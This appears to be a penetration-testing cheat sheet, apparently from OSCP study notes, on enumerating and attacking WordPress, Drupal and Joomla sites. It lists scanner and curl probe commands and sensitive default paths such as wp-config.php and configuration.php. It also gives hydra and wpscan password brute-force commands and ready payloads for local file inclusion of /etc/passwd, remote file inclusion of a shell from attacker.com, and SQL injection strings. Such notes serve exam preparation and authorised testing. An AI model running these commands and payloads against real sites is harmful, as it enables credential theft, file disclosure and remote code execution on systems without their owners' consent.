# CMS Enumeration (WordPress, Drupal, Joomla)

**Source:** gabb4r/OSCP Notes Integration

## WordPress Enumeration

### Version Detection

```bash
# Check wp-content directory
curl http://<IP>/wp-content/

# wp-json API
curl http://<IP>/wp-json/

# wp-links-opml
curl http://<IP>/wp-links-opml.php

# Theme detection
curl http://<IP>/wp-content/themes/
```

### WPScan

```bash
# Version detection
wpscan --url http://<IP>

# Plugin enumeration
wpscan --url http://<IP> --enumerate p

# Theme enumeration
wpscan --url http://<IP> --enumerate t

# User enumeration
wpscan --url http://<IP> --enumerate u

# Combined (aggressive)
wpscan --url http://<IP> --enumerate ap,at,u
```

### Default Paths

```bash
# Admin login
/wp-admin/
/wp-login.php
/administrator/

# Configuration
/wp-config.php
/wp-config-old.php

# Uploads
/wp-content/uploads/

# Plugins
/wp-content/plugins/
```

### Brute Force Login

```bash
# wpscan
wpscan --url http://<IP> --usernames admin -P /path/to/wordlist.txt

# hydra
hydra -l admin -P rockyou.txt http://<IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:S=Dashboard"
```

## Drupal Enumeration

### Version Detection

```bash
# CHANGELOG.txt
curl http://<IP>/CHANGELOG.txt

# Version in source
curl -s http://<IP> | grep "Drupal"

# Modules directory
curl http://<IP>/sites/all/modules/
```

### drupscan

```bash
drupscan scan drupal -u http://<IP>
drupscan scan drupal -u http://<IP> --enumerate u
```

### Default Paths

```bash
# Installation
/install.php

# Configuration
/sites/default/settings.php

# Modules
/sites/all/modules/
/modules/

# Database
/web.config
sites/default/files/
```

## Joomla Enumeration

### Version Detection

```bash
# administrator directory
curl http://<IP>/administrator/

# version.php
curl http://<IP>/administrator/manifests/files/joomla.xml

# components
curl http://<IP>/components/
```

### JoomScan

```bash
joomscan -u http://<IP>
joomscan -u http://<IP> --enumerate-extensions
```

### Default Paths

```bash
# Admin login
/administrator/

# Configuration
/configuration.php

# Components
/components/

# Modules
/modules/

# Plugins
/plugins/
```

## Common Vulnerabilities

### LFI in CMS

```bash
# WordPress plugin LFI
http://<IP>/wp-content/plugins/<plugin>/file.php?file=../../../../etc/passwd

# Drupal path traversal
http://<IP>/sites/default/files/../../etc/passwd

# Joomla LFI
http://<IP>/index.php?option=com_download&id=../../../../etc/passwd
```

### RFI Abuse

```bash
# WordPress
http://<IP>/wp-content/plugins/<plugin>/file.php?file=http://attacker.com/shell.txt

# Drupal
http://<IP>/index.php?module=http://attacker.com/shell.txt
```

### SQL Injection

```bash
# Test CMS parameters
http://<IP>/index.php?id=1' OR '1'='1
http://<IP>/products.php?cat=1' UNION SELECT NULL--
```

## Related Notes

- [[07-Web-Application/Web-Scanning]] → General web enumeration
- [[00-Quick-Reference/LFI]] → Path traversal exploitation
- [[07-Web-Application/SQLi]] → SQL injection techniques
